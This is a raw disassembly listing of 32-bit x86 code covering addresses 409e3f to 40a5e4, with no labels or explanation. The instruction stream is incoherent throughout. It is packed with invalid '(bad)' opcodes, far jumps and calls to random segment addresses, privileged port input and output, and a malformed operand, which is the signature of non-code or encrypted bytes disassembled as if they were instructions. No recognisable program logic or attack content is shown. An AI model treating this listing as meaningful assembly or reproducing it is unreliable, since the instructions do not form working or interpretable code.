  409e3f:	arpl   WORD PTR [ecx],si
  409e41:	xor    DWORD PTR [ecx],esi
  409e43:	in     al,dx
  409e44:	repnz push esp
  409e46:	inc    esi
  409e47:	xor    ebp,esp
  409e49:	xor    BYTE PTR [edx],0x6a
  409e4c:	div    BYTE PTR [esi]
  409e4e:	dec    edi
  409e4f:	cmp    DWORD PTR [esi],ebx
  409e51:	and    al,0x59
  409e53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e54:	dec    esi
  409e55:	(bad)  
  409e56:	les    edx,FWORD PTR [ebp+0x6414898d]
  409e5c:	retf   0xcebd
  409e5f:	neg    DWORD PTR [ebx+0x25488214]
  409e65:	jmp    0x904f4812
  409e6a:	and    bl,BYTE PTR [edx-0x681800bc]
  409e70:	rol    BYTE PTR [ebx+0x170c9c08],cl
  409e76:	ret    0x24e0
  409e79:	push   ss
  409e7a:	jbe    0x409ec1
  409e7c:	cmp    DWORD PTR [edx-0x34],esi
  409e7f:	sub    ch,BYTE PTR [eax+0x6b]
  409e82:	das    
  409e83:	jnp    0x409e78
  409e85:	jb     0x409e31
  409e87:	test   BYTE PTR [ebx],dh
  409e89:	(bad)  
  409e8a:	xlat   BYTE PTR ds:[ebx]
  409e8b:	lahf   
  409e8c:	push   esi
  409e8d:	mov    bh,0xfe
  409e8f:	(bad)  
  409e90:	dec    edi
  409e91:	dec    eax
  409e92:	pop    ecx
  409e93:	add    BYTE PTR [eax+0x46],0xda
  409e97:	add    edx,eax
  409e99:	push   ebx
  409e9a:	or     DWORD PTR [ebx+edx*4-0x4572012c],esp
  409ea1:	xchg   al,cl
  409ea3:	dec    ebx
  409ea4:	jmp    0x7aaa:0x5ac5f9a8
  409eab:	jnp    0x409eb0
  409ead:	ret    
  409eae:	repnz xchg ecx,eax
  409eb0:	fs mov ah,bl
  409eb3:	(bad)  
  409eb4:	mov    al,ds:0x20bb3f32
  409eb9:	add    eax,0x99913320
  409ebe:	dec    esi
  409ebf:	xchg   esp,eax
  409ec0:	sub    DWORD PTR [esp+eax*2+0x57],ebx
  409ec4:	or     BYTE PTR [esi+esi*2-0x47e5710c],ch
  409ecb:	inc    eax
  409ecc:	add    dh,cl
  409ece:	push   ds
  409ecf:	in     al,0xdb
  409ed1:	lods   al,BYTE PTR ds:[esi]
  409ed2:	ret    
  409ed3:	jmp    0x409e6d
  409ed5:	inc    ebx
  409ed6:	repnz xchg edx,eax
  409ed8:	pusha  
  409ed9:	stc    
  409eda:	sub    dl,dl
  409edc:	shl    BYTE PTR [ecx-0x1ef6a7d3],cl
  409ee2:	or     ebx,DWORD PTR [ecx]
  409ee4:	inc    esp
  409ee5:	or     al,0x19
  409ee7:	dec    edx
  409ee8:	adc    BYTE PTR [edx],0xad
  409eeb:	jmp    0xb288:0x489e797
  409ef2:	pop    eax
  409ef3:	pop    ebp
  409ef4:	cmp    eax,0xe715cc51
  409ef9:	xchg   edx,eax
  409efa:	xchg   esp,eax
  409efb:	push   ds
  409efc:	pop    ss
  409efd:	adc    al,0xd
  409eff:	cli    
  409f00:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  409f02:	mov    gs,WORD PTR [ebx-0x2641142f]
  409f08:	push   ds
  409f09:	outs   dx,DWORD PTR ds:[esi]
  409f0a:	mov    eax,ecx
  409f0c:	shl    BYTE PTR [edi],cl
  409f0e:	xor    al,0x1b
  409f10:	jns    0x409f20
  409f12:	gs in  eax,dx
  409f14:	mov    ebx,0xd017e9a9
  409f19:	jno    0x409eba
  409f1b:	call   0x7d2c:0x37d12de3
  409f22:	(bad)  
  409f23:	pop    eax
  409f24:	xor    esi,DWORD PTR [ebp+0x22]
  409f27:	push   ebx
  409f28:	lock retf 
  409f2a:	loop   0x409f97
  409f2c:	fild   DWORD PTR [ebx]
  409f2e:	stc    
  409f2f:	js     0x409f37
  409f31:	sbb    al,0x7d
  409f33:	sub    al,0x4
  409f35:	ret    0x469e
  409f38:	and    edi,DWORD PTR [ebx]
  409f3a:	fcom   DWORD PTR ds:0x68580fe6
  409f40:	outs   dx,BYTE PTR ds:[esi]
  409f41:	cmp    ch,BYTE PTR [edi]
  409f43:	xor    DWORD PTR [ebx+0x4],ecx
  409f46:	and    dh,cl
  409f48:	push   esi
  409f49:	int    0x3c
  409f4b:	pop    edi
  409f4c:	xlat   BYTE PTR ds:[ebx]
  409f4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f4e:	idiv   DWORD PTR [edi]
  409f50:	imul   ebx,DWORD PTR [ebx-0x56],0x45086961
  409f57:	cmp    bh,BYTE PTR [ebp+0x22]
  409f5a:	jae    0x409efd
  409f5c:	shufps xmm3,XMMWORD PTR [ecx+edi*4-0x69],0x95
  409f62:	and    DWORD PTR [edx],ebp
  409f64:	stos   DWORD PTR es:[edi],eax
  409f65:	repnz and BYTE PTR [eax+0x5aea047c],bh
  409f6c:	mov    bl,0xc2
  409f6e:	xchg   edi,eax
  409f6f:	mov    ds:0xd53e2b3b,eax
  409f74:	lock xchg ebp,eax
  409f76:	jo     0x409f59
  409f78:	daa    
  409f79:	leave  
  409f7a:	mov    esp,0xc5dd95a0
  409f7f:	sub    DWORD PTR [ecx],ebx
  409f81:	lods   al,BYTE PTR ds:[esi]
  409f82:	test   eax,0x722d85fa
  409f87:	xor    dl,BYTE PTR [eax+0x11847c95]
  409f8d:	test   eax,0xc4437b4d
  409f92:	pop    edi
  409f93:	xchg   esp,eax
  409f94:	call   0xb58b:0x9739a78a
  409f9b:	adc    al,0x51
  409f9d:	clc    
  409f9e:	jnp    0x409fcc
  409fa0:	cdq    
  409fa1:	outs   dx,WORD PTR ds:[esi]
  409fa3:	mov    cl,0x5
  409fa5:	xchg   ebp,eax
  409fa6:	cld    
  409fa7:	fxch   st(5)
  409fa9:	inc    ebp
  409fab:	xchg   BYTE PTR [ebp+0x15],ah
  409fae:	sub    ah,BYTE PTR [esi+esi*1]
  409fb1:	into   
  409fb2:	jmp    0x1ec2:0xe1ceef75
  409fb9:	sahf   
  409fba:	adc    esp,esi
  409fbc:	jle    0x409f50
  409fbe:	retf   0xdc61
  409fc1:	pop    edi
  409fc2:	dec    esp
  409fc3:	addr16 aam 0xd2
  409fc6:	loope  0x409f8d
  409fc8:	mov    eax,0xaa1a2245
  409fcd:	and    eax,0x2170181d
  409fd2:	jmp    0x7ef2:0x99158ec2
  409fd9:	loope  0x409f5e
  409fdb:	and    eax,0x277a9fd6
  409fe0:	jbe    0x409f70
  409fe2:	retf   0x1b15
  409fe5:	daa    
  409fe6:	push   0x4e
  409fe8:	or     eax,ebx
  409fea:	mov    cl,0x37
  409fec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fed:	les    eax,FWORD PTR [esi+0x7397c6c]
  409ff3:	jp     0x409f89
  409ff5:	retf   
  409ff6:	push   ebp
  409ff7:	inc    esp
  409ff8:	inc    esp
  409ff9:	jnp    0x409fef
  409ffb:	xchg   BYTE PTR [esi],al
  409ffd:	repz mov ch,0x5a
  40a000:	mov    esi,0xf082d9d3
  40a005:	jb     0x409fb4
  40a007:	jns    0x40a060
  40a009:	add    ch,BYTE PTR [ebx]
  40a00b:	push   edi
  40a00c:	or     DWORD PTR [esp-0x3a],ebp
  40a010:	mov    ebx,0x320e633f
  40a015:	lahf   
  40a016:	sbb    al,0x7a
  40a018:	mov    BYTE PTR [ecx*8-0x209625de],dh
  40a01f:	loopne 0x409fdd
  40a021:	lds    ebp,FWORD PTR [edi+0x4bb5549f]
  40a027:	push   esp
  40a028:	mov    bl,0x74
  40a02a:	sti    
  40a02b:	adc    edx,DWORD PTR ds:[eax]
  40a02e:	sbb    eax,0x75b0af46
  40a033:	sbb    BYTE PTR [ecx-0x130db16d],0xd4
  40a03a:	sub    ebx,DWORD PTR [esi+ebp*8+0xcea371e]
  40a041:	lds    ebx,FWORD PTR [ebx]
  40a043:	imul   eax,DWORD PTR [eax+0x4e],0xb3f7001a
  40a04a:	mov    ah,0x77
  40a04c:	lea    eax,[edx]
  40a04e:	aad    0xc2
  40a050:	jle    0x40a011
  40a052:	mov    al,0x68
  40a054:	push   ecx
  40a055:	int    0xc2
  40a057:	addr16 pop ebp
  40a059:	xor    al,0x39
  40a05b:	adc    DWORD PTR [ecx+0x1e],0xffffffdf
  40a05f:	ss shl ch,0x1e
  40a063:	sahf   
  40a064:	jg     0x40a009
  40a066:	das    
  40a067:	jno    0x40a058
  40a069:	mov    dh,0x6d
  40a06b:	adc    eax,0x63219b73
  40a070:	(bad)  
  40a071:	repnz pop esi
  40a073:	(bad)  
  40a074:	in     eax,dx
  40a075:	out    dx,eax
  40a076:	mov    bh,0xf0
  40a078:	in     eax,0x6
  40a07a:	outs   dx,BYTE PTR ds:[esi]
  40a07b:	scas   al,BYTE PTR es:[edi]
  40a07c:	dec    eax
  40a07d:	sar    BYTE PTR [ecx-0x48835eba],cl
  40a083:	mov    dh,0xda
  40a085:	adc    eax,ecx
  40a087:	iret   
  40a088:	xchg   edi,eax
  40a089:	jb     0x40a0a9
  40a08b:	lods   eax,DWORD PTR ds:[esi]
  40a08c:	push   esp
  40a08d:	push   sp
  40a08f:	adc    DWORD PTR [edx-0x16e4fd9f],ebx
  40a095:	js     0x40a019
  40a097:	xor    ecx,DWORD PTR [eax]
  40a099:	or     al,0xb8
  40a09b:	add    ecx,esi
  40a09d:	or     ch,BYTE PTR [edx+0x67]
  40a0a0:	xlat   BYTE PTR ds:[ebx]
  40a0a1:	in     eax,dx
  40a0a2:	mov    ds,WORD PTR [edi*8-0x167cfe72]
  40a0a9:	xchg   ebx,eax
  40a0aa:	in     al,dx
  40a0ab:	jmp    0x40a11d
  40a0ad:	cmc    
  40a0ae:	popa   
  40a0af:	stos   BYTE PTR es:[edi],al
  40a0b0:	adc    DWORD PTR ds:0x8e5f9af3,ecx
  40a0b6:	xor    eax,0x69876ef5
  40a0bb:	(bad)  
  40a0bc:	jecxz  0x40a0cc
  40a0be:	int    0xda
  40a0c0:	jg     0x40a13c
  40a0c2:	add    DWORD PTR ds:0xeb7de384,edx
  40a0c8:	fs inc esp
  40a0ca:	in     eax,dx
  40a0cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0cc:	pop    ebx
  40a0cd:	cld    
  40a0ce:	int3   
  40a0cf:	inc    esp
  40a0d0:	jae    0x40a076
  40a0d2:	cmc    
  40a0d3:	das    
  40a0d4:	fwait
  40a0d5:	sbb    edx,edx
  40a0d7:	and    eax,0x11af702b
  40a0dc:	loope  0x40a0cf
  40a0de:	xchg   ecx,eax
  40a0df:	pop    ebp
  40a0e0:	push   ebx
  40a0e1:	pop    ebx
  40a0e2:	lahf   
  40a0e3:	mov    WORD PTR [eax-0x6],gs
  40a0e6:	push   esi
  40a0e7:	xor    cl,BYTE PTR [esi+ebp*1-0x7c]
  40a0eb:	and    esi,DWORD PTR [ebx+0x17979600]
  40a0f1:	int3   
  40a0f2:	cwde   
  40a0f3:	pop    ebp
  40a0f4:	mov    esi,0xb6bb3d76
  40a0f9:	ins    DWORD PTR es:[edi],dx
  40a0fa:	dec    ecx
  40a0fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0fc:	sbb    ebx,ebp
  40a0fe:	in     al,dx
  40a0ff:	add    dl,BYTE PTR [ecx+eiz*8-0x643dca19]
  40a106:	adc    eax,DWORD PTR [edi+0x5d5fedb8]
  40a10c:	dec    edx
  40a10d:	lea    eax,[esi-0x7cce08c7]
  40a113:	jno    0x40a13d
  40a115:	dec    eax
  40a116:	call   0xb704:0x8a61de9d
  40a11d:	pop    esp
  40a11e:	dec    ecx
  40a11f:	mov    esi,0xb42d19e2
  40a124:	adc    DWORD PTR [edi+0x52],esi
  40a127:	data16 cmp al,ah
  40a12a:	in     eax,0xd6
  40a12c:	mov    ds,WORD PTR [ecx]
  40a12e:	adc    al,dh
  40a130:	xor    esp,ecx
  40a132:	sub    al,0xdb
  40a134:	dec    esi
  40a135:	xor    DWORD PTR [edi-0x6b814eed],esp
  40a13b:	pop    esi
  40a13c:	je     0x40a14c
  40a13e:	(bad)  
  40a13f:	fsub   DWORD PTR [eax-0x462a6a64]
  40a145:	fidivr WORD PTR [ecx+0x6f]
  40a148:	into   
  40a149:	lods   al,BYTE PTR ds:[esi]
  40a14a:	mov    ebx,0x6b6d911c
  40a14f:	pop    ebx
  40a150:	nop
  40a151:	sub    BYTE PTR [esi],0x73
  40a154:	test   eax,0x8a175edc
  40a159:	ja     0x40a131
  40a15b:	mov    ah,0xc1
  40a15d:	cli    
  40a15e:	fnstenv ds:0xfd37537c
  40a164:	shl    BYTE PTR [eax],cl
  40a166:	adc    ebx,edi
  40a168:	pop    es
  40a169:	mov    BYTE PTR [ebp-0x47],0x98
  40a16d:	retf   
  40a16e:	xor    eax,0x3952196e
  40a173:	mov    edx,0x27b4b98f
  40a178:	add    DWORD PTR [edi-0x37],ebp
  40a17b:	mov    bl,0x84
  40a17d:	dec    ecx
  40a17e:	jns    0x40a1fa
  40a180:	les    ebp,FWORD PTR [ebp-0x5d]
  40a183:	or     al,0x5c
  40a185:	addr16 sar bh,1
  40a188:	dec    esp
  40a189:	jmp    DWORD PTR [edi+0x5f4627da]
  40a18f:	icebp  
  40a190:	mov    dh,0x12
  40a192:	rol    edi,0x1e
  40a195:	loope  0x40a19f
  40a197:	push   ebp
  40a198:	stc    
  40a199:	fstp   TBYTE PTR [eax]
  40a19b:	sbb    DWORD PTR [esi+0x66],esp
  40a19e:	shl    BYTE PTR [edi-0x50],cl
  40a1a1:	ror    BYTE PTR [ebx+eiz*8],1
  40a1a4:	inc    ecx
  40a1a5:	pop    ebp
  40a1a6:	mov    ?,WORD PTR [edx+edi*8]
  40a1a9:	xor    bh,BYTE PTR [eax+0x722ba0c2]
  40a1af:	sbb    edx,DWORD PTR [ebx+0x3a68a826]
  40a1b5:	pop    esp
  40a1b6:	adc    dh,BYTE PTR [ebx+0x13]
  40a1b9:	or     al,0x87
  40a1bb:	adc    cl,0xe
  40a1be:	in     eax,dx
  40a1bf:	rcl    DWORD PTR [eax-0x1f],cl
  40a1c2:	(bad)  
  40a1c3:	xchg   edx,eax
  40a1c4:	cmp    BYTE PTR [edi-0x68],dh
  40a1c7:	inc    esi
  40a1c8:	mov    al,ds:0x22c21e0
  40a1cd:	cwde   
  40a1ce:	into   
  40a1cf:	fsubp  st(2),st
  40a1d1:	cmc    
  40a1d2:	mov    BYTE PTR [esi-0x1d],ah
  40a1d5:	shl    DWORD PTR [ecx-0x49],0x1c
  40a1d9:	fld    TBYTE PTR [edi-0x119531a5]
  40a1df:	dec    eax
  40a1e0:	ja     0x40a182
  40a1e2:	ds push ecx
  40a1e4:	lock pop ecx
  40a1e6:	dec    ebp
  40a1e7:	jl     0x40a22f
  40a1e9:	cld    
  40a1ea:	pop    ecx
  40a1eb:	dec    ecx
  40a1ec:	sbb    dh,BYTE PTR [esi-0x37ca7eb2]
  40a1f2:	cmc    
  40a1f3:	cmp    eax,0xdfbd0e31
  40a1f8:	mov    edi,edx
  40a1fa:	mov    ch,0x11
  40a1fc:	mov    eax,ds:0x8b768452
  40a201:	push   ecx
  40a202:	lock lock pop esp
  40a205:	mov    bl,dh
  40a207:	xchg   DWORD PTR [ebx],edx
  40a209:	popf   
  40a20a:	call   0xab46:0x91c2cbfe
  40a211:	mul    esi
  40a213:	push   ebp
  40a214:	and    ecx,DWORD PTR [ebx*2+0x21ba8a30]
  40a21b:	dec    ecx
  40a21c:	sbb    eax,0x6c257634
  40a221:	dec    ebp
  40a222:	xor    ah,cl
  40a224:	pop    ds
  40a225:	add    eax,0x530a65db
  40a22a:	fidiv  WORD PTR [edx+ebx*8+0x24]
  40a22e:	mov    eax,ds:0x2aedbb0d
  40a233:	add    edx,DWORD PTR [ebx+ecx*4-0x5c755296]
  40a23a:	adc    edi,DWORD PTR [edi-0x177ce7d6]
  40a240:	adc    al,0xdf
  40a242:	add    ebx,DWORD PTR [ebx]
  40a244:	repnz or bh,bh
  40a247:	rcr    DWORD PTR [ecx+ecx*4],1
  40a24a:	adc    eax,0x7d8efd6
  40a24f:	(bad)  
  40a250:	ins    DWORD PTR es:[edi],dx
  40a251:	ret    
  40a252:	popa   
  40a253:	push   eax
  40a254:	stos   DWORD PTR es:[edi],eax
  40a255:	sbb    ecx,DWORD PTR [eax-0x3a]
  40a258:	imul   ecx,DWORD PTR [eax],0xb1d7690f
  40a25e:	jnp    0x40a2a2
  40a260:	test   al,0xf3
  40a262:	pop    edi
  40a263:	xchg   edx,eax
  40a264:	fcom   DWORD PTR [esi+0x23e02c2a]
  40a26a:	mov    ebp,0x1a58b5b5
  40a26f:	mov    bl,0x1d
  40a271:	mov    eax,ds:0xc2fe3ad8
  40a276:	outs   dx,BYTE PTR ds:[esi]
  40a277:	adc    DWORD PTR [ecx+edi*2-0x7e0373af],ecx
  40a27e:	xor    DWORD PTR [ecx],edx
  40a280:	into   
  40a281:	and    al,0x1e
  40a283:	je     0x40a27e
  40a285:	data16 into 
  40a287:	jmp    FWORD PTR [ecx]
  40a289:	xor    eax,DWORD PTR [edi-0x64]
  40a28c:	xchg   edi,eax
  40a28d:	call   0xfa83b65d
  40a292:	push   eax
  40a293:	pop    eax
  40a294:	push   edi
  40a295:	outs   dx,BYTE PTR ds:[esi]
  40a296:	mov    WORD PTR [eax],ds
  40a298:	cmp    eax,0x8c6f6d0
  40a29d:	xchg   edx,eax
  40a29e:	arpl   WORD PTR [edi+0xc16caa5],dx
  40a2a4:	dec    eax
  40a2a5:	or     BYTE PTR ds:0x98f2fc71,dh
  40a2ab:	cmp    BYTE PTR [edi+0x4a44a7d4],dl
  40a2b1:	add    edi,eax
  40a2b3:	push   edx
  40a2b4:	add    DWORD PTR [edi-0x667d7cd4],edx
  40a2ba:	div    DWORD PTR ds:0x150a2d1d
  40a2c0:	(bad)  
  40a2c1:	sub    al,0x22
  40a2c3:	mov    ss,WORD PTR [esi+0x7f]
  40a2c6:	cmp    esp,esp
  40a2c8:	out    0xde,eax
  40a2ca:	jno    0x40a333
  40a2cc:	daa    
  40a2cd:	popf   
  40a2ce:	inc    esi
  40a2cf:	repz push eax
  40a2d1:	jo     0x40a341
  40a2d3:	sti    
  40a2d4:	pop    es
  40a2d5:	out    dx,al
  40a2d6:	jo     0x40a302
  40a2d8:	ror    DWORD PTR [ebx+0x22],1
  40a2db:	lock mov dl,0x7b
  40a2de:	sbb    eax,0xa372d7d0
  40a2e3:	pop    eax
  40a2e4:	mov    al,ds:0x5a2bc8df
  40a2e9:	sti    
  40a2ea:	pusha  
  40a2eb:	daa    
  40a2ec:	jns    0x40a29e
  40a2ee:	call   0x1dfc5595
  40a2f3:	pop    ecx
  40a2f4:	pop    es
  40a2f5:	sti    
  40a2f6:	sar    DWORD PTR [ebx+0x610c46c9],cl
  40a2fc:	aad    0x8e
  40a2fe:	inc    esp
  40a2ff:	sbb    eax,0x1a54ece6
  40a304:	mov    bl,0x11
  40a306:	push   es
  40a307:	add    edi,DWORD PTR ds:0x8c0f9231
  40a30d:	nop
  40a30e:	mov    al,al
  40a310:	mov    ebp,DWORD PTR [edi+0x6e]
  40a313:	or     ch,al
  40a315:	sbb    DWORD PTR [ebp-0x36067fa5],0xc35a6166
  40a31f:	je     0x40a366
  40a321:	mov    eax,ds:0x7d768f90
  40a326:	push   ecx
  40a327:	pop    es
  40a328:	jecxz  0x40a2b5
  40a32a:	mov    edi,0xf34828de
  40a32f:	fsub   QWORD PTR [ebp+0x18]
  40a332:	push   edi
  40a333:	and    BYTE PTR [esi-0x38e3b374],bl
  40a339:	arpl   sp,cx
  40a33b:	sahf   
  40a33c:	mov    ch,0x56
  40a33e:	ins    DWORD PTR es:[edi],dx
  40a33f:	fwait
  40a340:	sbb    dl,dh
  40a342:	aam    0x41
  40a344:	lods   al,BYTE PTR ds:[esi]
  40a345:	sub    esp,DWORD PTR [edx+0x1eebbd3e]
  40a34b:	inc    ebp
  40a34c:	push   ecx
  40a34d:	pusha  
  40a34e:	xor    ebx,ebx
  40a350:	rol    edx,1
  40a352:	int3   
  40a353:	sub    eax,0x668c6319
  40a358:	cwde   
  40a359:	std    
  40a35a:	xor    BYTE PTR [edx+0x2c93a76f],dh
  40a360:	xlat   BYTE PTR ds:[ebx]
  40a361:	add    ebx,DWORD PTR [ebx]
  40a363:	add    eax,0x5c1a5126
  40a368:	or     ebx,DWORD PTR [edi+0xb]
  40a36b:	pop    ebp
  40a36c:	push   cs
  40a36d:	jb     0x40a306
  40a36f:	dec    esi
  40a370:	pop    ebp
  40a371:	mov    edx,0xe3eaaf22
  40a376:	push   ebp
  40a377:	sbb    eax,0xe405e01c
  40a37c:	xchg   edi,eax
  40a37d:	call   0x10278b81
  40a382:	sar    BYTE PTR [esi+0x704ef0ae],0x16
  40a389:	lock xchg ebx,eax
  40a38b:	ss add bl,dh
  40a38e:	mov    es,WORD PTR [edi+eax*1]
  40a391:	fwait
  40a392:	cdq    
  40a393:	add    eax,0x3a45bded
  40a398:	(bad)  
  40a399:	popf   
  40a39a:	div    DWORD PTR [edx]
  40a39c:	test   al,0x69
  40a39e:	call   0xf5ce:0xe94443f
  40a3a5:	or     eax,ecx
  40a3a7:	xchg   al,bl
  40a3a9:	xchg   DWORD PTR [esi+0x1d9e8c9f],ebp
  40a3af:	cmp    eax,0xaededf1c
  40a3b4:	jnp    0x40a3a3
  40a3b6:	fs in  al,0xb4
  40a3b9:	icebp  
  40a3ba:	int3   
  40a3bb:	mov    WORD PTR [esi+0x4d3c8afa],es
  40a3c1:	mov    dh,BYTE PTR [ecx+0x6628de68]
  40a3c7:	aad    0x43
  40a3c9:	lds    eax,FWORD PTR [edi]
  40a3cb:	aaa    
  40a3cc:	inc    esp
  40a3cd:	pop    esp
  40a3ce:	int3   
  40a3cf:	adc    BYTE PTR [esi],0x90
  40a3d2:	ins    DWORD PTR es:[edi],dx
  40a3d3:	adc    edx,edi
  40a3d5:	sti    
  40a3d6:	enter  0xcf83,0xe4
  40a3da:	mov    esi,0x46fa028
  40a3df:	mov    ss,WORD PTR [esi+0x6b9e061a]
  40a3e5:	or     ah,BYTE PTR [eax-0x6060afc3]
  40a3eb:	ins    BYTE PTR es:[edi],dx
  40a3ec:	push   es
  40a3ed:	loop   0x40a3d1
  40a3ef:	add    ch,BYTE PTR [ebx-0x20]
  40a3f2:	jmp    0x40a38e
  40a3f4:	sbb    esi,ebp
  40a3f6:	xor    eax,0x8f08ff24
  40a3fb:	jecxz  0x40a419
  40a3fd:	dec    BYTE PTR [eax]
  40a3ff:	add    eax,0xdf573533
  40a405:	hlt    
  40a406:	cmp    esp,esi
  40a408:	or     ebp,DWORD PTR [edi+0x4bec5958]
  40a40e:	jo     0x40a47e
  40a410:	xchg   esi,eax
  40a411:	jl     0x40a3fc
  40a413:	mov    ebx,ecx
  40a415:	inc    BYTE PTR [ecx]
  40a417:	pop    esi
  40a418:	aas    
  40a419:	xor    eax,0x48ae010a
  40a41e:	jmp    0xc6a5:0x369fc120
  40a425:	mov    bl,0x38
  40a427:	inc    ebx
  40a428:	int    0x73
  40a42a:	push   eax
  40a42b:	xor    bl,BYTE PTR [edx-0x5a340b75]
  40a431:	or     eax,0x5057b6a8
  40a436:	lock inc ebp
  40a438:	dec    edx
  40a439:	loope  0x40a49a
  40a43b:	and    BYTE PTR ds:0x760e2542,cl
  40a441:	into   
  40a442:	lods   al,BYTE PTR ds:[esi]
  40a443:	sbb    BYTE PTR ds:0x54f1150e,dl
  40a449:	lods   al,BYTE PTR ds:[esi]
  40a44a:	iret   
  40a44b:	mov    esi,0xc9358
  40a450:	xchg   ebx,eax
  40a451:	stc    
  40a452:	(bad)  
  40a453:	fisttp DWORD PTR [ebp+ebx*8+0x62]
  40a457:	inc    esp
  40a458:	sub    dl,BYTE PTR [edi+0x277c5672]
  40a45e:	push   ss
  40a45f:	(bad)  
  40a460:	test   DWORD PTR [eax+edx*2-0x1305421b],0xffa4f795
  40a46b:	inc    edi
  40a46c:	outs   dx,BYTE PTR ds:[esi]
  40a46d:	jmp    0x54e4511b
  40a472:	or     DWORD PTR [eax],0xffffffdd
  40a475:	addr16 mov bh,0x34
  40a478:	xchg   edx,eax
  40a479:	ins    DWORD PTR es:[edi],dx
  40a47a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a47b:	cmp    ah,BYTE PTR [ebx-0xb]
  40a47e:	popa   
  40a47f:	and    cl,BYTE PTR [esi+0x12]
  40a482:	in     eax,0x5a
  40a484:	xlat   BYTE PTR ds:[ebx]
  40a485:	jnp    0x40a4f3
  40a487:	push   DWORD PTR [edi-0x61534552]
  40a48d:	adc    BYTE PTR [edi-0x413d11b5],dl
  40a493:	add    ebx,edx
  40a495:	es cmp al,0x13
  40a498:	sub    ch,BYTE PTR [esi-0x40]
  40a49b:	js     0x40a4b5
  40a49d:	push   esp
  40a49e:	ins    BYTE PTR es:[edi],dx
  40a49f:	mov    al,0xbb
  40a4a1:	or     al,0x95
  40a4a3:	icebp  
  40a4a4:	inc    esp
  40a4a5:	xchg   ecx,ebp
  40a4a7:	leave  
  40a4a8:	jmp    0xd92a02c4
  40a4ad:	dec    ebp
  40a4ae:	ret    0x8383
  40a4b1:	fisub  DWORD PTR [edi]
  40a4b3:	daa    
  40a4b4:	jmp    0xdda7:0x329f5f1f
  40a4bb:	adc    esp,DWORD PTR [edi-0x10d281e9]
  40a4c1:	(bad)  
  40a4c2:	mov    ds:0x38d39107,eax
  40a4c7:	repz int 0x56
  40a4ca:	push   ecx
  40a4cb:	int    0x68
  40a4cd:	xchg   edx,eax
  40a4ce:	push   cs
  40a4cf:	sbb    al,0xe
  40a4d1:	pop    eax
  40a4d2:	ss pop esi
  40a4d4:	sbb    BYTE PTR ds:0x289f0a73,bh
  40a4da:	imul   ecx,DWORD PTR [edi],0x15
  40a4dd:	mov    eax,ds:0xfacce405
  40a4e2:	dec    eax
  40a4e3:	sub    ch,cl
  40a4e5:	adc    eax,ebx
  40a4e7:	cmp    eax,0x275ef2ca
  40a4ec:	lds    ebx,FWORD PTR [esi-0x50d43d85]
  40a4f2:	pop    ecx
  40a4f3:	in     al,dx
  40a4f4:	das    
  40a4f5:	sub    cx,WORD PTR [eax]
  40a4f8:	jns    0x40a48e
  40a4fa:	mov    cl,0x48
  40a4fc:	mov    ebx,0x740c6535
  40a501:	xchg   DWORD PTR [esi-0x3a],edx
  40a504:	js     0x40a50b
  40a506:	mov    cl,0x94
  40a508:	jno    0x40a4e1
  40a50a:	adc    al,0x2b
  40a50c:	outs   dx,BYTE PTR ds:[esi]
  40a50d:	mov    ebx,DWORD PTR [ecx+0x290a0e3f]
  40a513:	xchg   edx,esi
  40a515:	loopne 0x40a4c7
  40a517:	xchg   BYTE PTR [edi-0x41],ah
  40a51a:	jge    0x40a4c6
  40a51c:	sbb    al,0x10
  40a51e:	jne    0x40a57c
  40a520:	iret   
  40a521:	jmp    0x2d56ea1b
  40a526:	xchg   BYTE PTR [esi-0x1a91b22f],bl
  40a52c:	pop    eax
  40a52d:	(bad)  [edi-0x21]
  40a530:	fs icebp 
  40a532:	iret   
  40a533:	or     eax,0xea8b548b
  40a538:	pop    esp
  40a539:	push   esi
  40a53a:	push   0xffffffbf
  40a53c:	sub    DWORD PTR [ebx+ecx*8+0x4645649e],edx
  40a543:	mov    eax,ds:0x17b2268d
  40a548:	daa    
  40a549:	dec    ecx
  40a54a:	not    DWORD PTR [edx+0x78]
  40a54d:	adc    esi,edi
  40a54f:	and    DWORD PTR [edi],0xfffffff2
  40a552:	loop   0x40a4d7
  40a554:	sub    DWORD PTR [edx+edx*4-0x7a],ebp
  40a558:	nop
  40a559:	ja     0x40a521
  40a55b:	repnz adc al,0x22
  40a55e:	sbb    al,0xe8
  40a560:	hlt    
  40a561:	sbb    bl,BYTE PTR [eax-0x7576a6a7]
  40a567:	les    eax,FWORD PTR ds:0xd3617992
  40a56d:	mov    ebp,0xbba2b65b
  40a572:	into   
  40a573:	or     ecx,DWORD PTR [ebx+0x1eed788f]
  40a579:	(bad)  
  40a57a:	pop    edx
  40a57b:	lods   eax,DWORD PTR ds:[esi]
  40a57c:	mov    ds:0x7024821e,eax
  40a581:	loop   0x40a545
  40a583:	out    dx,eax
  40a584:	or     BYTE PTR [eax+0x49c38b94],al
  40a58a:	shl    BYTE PTR fs:[ebp+0x6b99f4e5],1
  40a591:	inc    esp
  40a592:	loop   0x40a554
  40a594:	je     0x40a5db
  40a596:	rol    BYTE PTR [eax-0x5c8903cc],1
  40a59c:	mov    DWORD PTR [esi-0x7874cce2],esp
  40a5a2:	lock jmp 0x40a54e
  40a5a5:	shr    dl,1
  40a5a7:	shl    BYTE PTR [ecx],1
  40a5a9:	jp     0x40a548
  40a5ab:	sti    
  40a5ac:	sbb    eax,0x13068d27
  40a5b1:	inc    ecx
  40a5b2:	pop    ebx
  40a5b3:	push   ebp
  40a5b4:	ds cmp dx,bx
  40a5b8:	push   esi
  40a5b9:	(bad)  
  40a5ba:	sub    DWORD PTR [edi-0x1bedf401],0x62
  40a5c1:	loope  0x40a58d
  40a5c3:	cli    
  40a5c4:	clc    
  40a5c5:	sbb    eax,DWORD PTR [edx+eax*8+0xeca463b]
  40a5cc:	std    
  40a5cd:	retf   0x5e71
  40a5d0:	adc    bh,BYTE PTR [edi-0x78]
  40a5d3:	cmc    
  40a5d4:	and    eax,0xb60de100
  40a5d9:	out    dx,eax
  40a5da:	test   al,0xf7
  40a5dc:	arpl   WORD PTR [ebp+0x6b],ax
  40a5df:	add    BYTE PTR [edi-0x39],bl
  40a5e2:	cli    
  40a5e3:	iret   
  40a5e4:	call   0x20d2f8b
